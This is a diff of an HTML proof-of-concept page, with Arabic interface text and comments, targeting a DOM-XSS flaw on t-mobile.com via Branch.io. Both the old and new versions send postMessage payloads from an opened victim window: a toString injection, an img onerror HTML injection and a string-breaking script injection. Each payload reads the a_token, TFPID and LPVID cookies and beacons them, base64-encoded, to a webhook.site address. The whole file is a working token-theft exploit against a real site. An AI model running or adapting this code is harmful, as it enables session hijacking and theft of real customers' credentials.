@@ -1,70 +1,65 @@
 <!doctype html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>T-Mobile PoC Final</title>
+    <title>T-Mobile Exploit - Branch.io Sink</title>
 </head>
-<body style="background: #1a1a1a; color: #e20074; text-align: center; padding-top: 50px; font-family: Arial;">
-    <h1>T-Mobile Security Research</h1>
-    <div style="border: 2px solid #e20074; display: inline-block; padding: 20px;">
-        <button onclick="exploit()" style="padding: 15px 30px; background: #e20074; color: white; border: none; cursor: pointer; font-weight: bold;">تشغيل هجوم تسريب التوكن</button>
-        <p id="log" style="color: #00ff00; font-family: monospace;"></p>
+<body style="background: #000; color: #e20074; text-align: center; padding-top: 50px; font-family: monospace;">
+
+    <h1>T-Mobile Security Research (PoC)</h1>
+    <div style="border: 2px solid #e20074; padding: 20px; display: inline-block;">
+        <p>المستهدف: DOM-XSS عبر Branch.io RenderQueue</p>
+        <button onclick="launch()" style="padding: 15px; background: #e20074; color: #fff; border: none; cursor: pointer; font-weight: bold;">تشغيل الهجوم</button>
+        <div id="status" style="margin-top: 20px; color: #00ff00;"></div>
     </div>
 
 <script>
-    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
-    
-    function log(m) { document.getElementById('log').innerText = "> " + m; }
+    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
 
-    function exploit() {
-        log("يتم فتح T-Mobile...");
-        // فتح النافذة وتخزين المرجع
-        const vicWin = window.open('https://www.t-mobile.com/', 'victim');
+    function log(msg) { document.getElementById('status').innerText = "> " + msg; }
 
-        if (!vicWin) {
-            alert("يرجى تفعيل الـ Pop-ups!");
+    function launch() {
+        log("فتح نافذة الضحية...");
+        const vic = window.open('https://www.t-mobile.com/', 'victim');
+
+        if (!vic) {
+            alert("يرجى السماح بالـ Pop-ups");
             return;
         }
 
-        // تحضير الـ Payload بناءً على ما نجح معك في الكونسول
-        // لاحظ: نستخدم String هنا لتجنب DataCloneError
-        const payloadObject = {
-            "type": "qm-sync", 
+        // Payload مصمم لكسر سياق الـ Render في Branch.io
+        // بنجرب 3 أنواع من الحقن في رسالة واحدة
+        const payload = {
+            "type": "qm-sync", // النوع اللي اتعرف عليه Quantum Metric
             "details": {
-                "account": "SCRUB_ME",
+                "account_number": "SCRUB_ME",
                 "cvv": "999",
-                "toString": `() => {
-                    const k = ['a_token', 'TFPID', 'LPVID'];
-                    const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
-                    navigator.sendBeacon('${webh}/?auth=' + btoa(d));
-                }`
+                // المحاولة 1: حقن HTML (لو الـ Sink هو innerHTML)
+                "html_payload": `<img src=x onerror="const k=['a_token','TFPID'];const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|');navigator.sendBeacon('${webhook}/?xss_html=' + btoa(d));">`,
+                
+                // المحاولة 2: كسر سلسلة نصية (لو الـ Sink هو eval أو JS Variable)
+                "toString": `');} catch(e){} const k=['a_token','TFPID']; const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|'); navigator.sendBeacon('${webhook}/?xss_js=' + btoa(d));//`
             }
         };
 
-        log("انتظار تحميل السكربتات... (سيتم الإرسال بعد 10 ثوانٍ)");
+        log("انتظار تحميل السكربتات (10 ثوانٍ)...");
 
-        // سنقوم بإرسال الرسالة كل 3 ثوانٍ لمدة دقيقة لضمان "صيد" الـ Listener
-        let attempts = 0;
+        let count = 0;
         const interval = setInterval(() => {
-            attempts++;
-            try {
-                // الطريقة 1: إرسال كـ Object (لو الـ Listener بيفك الـ Clone)
-                // ملحوظة: لإرسال دالةtoString، المتصفح قد يمنعها، لذا نرسل الـ Payload داخل String
-                vicWin.postMessage(payloadObject, "*");
+            count++;
+            log("إرسال النبضة رقم: " + count);
 
-                // الطريقة 2: إرسال كـ JSON String (الأكثر فعالية لتخطي حواجز الـ Origin)
-                vicWin.postMessage(JSON.stringify(payloadObject), "*");
+            // إرسال كـ String لتخطي الـ Clone Error وضمان وصوله لـ JSON.parse
+            vic.postMessage(JSON.stringify(payload), "*");
+            
+            // إرسال كـ Object مباشر احتياطاً
+            vic.postMessage(payload, "*");
 
-                log("محاولة إرسال رقم: " + attempts);
-            } catch (e) {
-                log("خطأ في الإرسال: " + e.message);
-            }
-
-            if (attempts > 20) {
+            if (count >= 15) {
                 clearInterval(interval);
-                log("انتهت المحاولات. افحص الـ Webhook.");
+                log("اكتمل الإرسال. افحص الـ Webhook.");
             }
-        }, 3000);
+        }, 4000);
     }
 </script>
 </body>
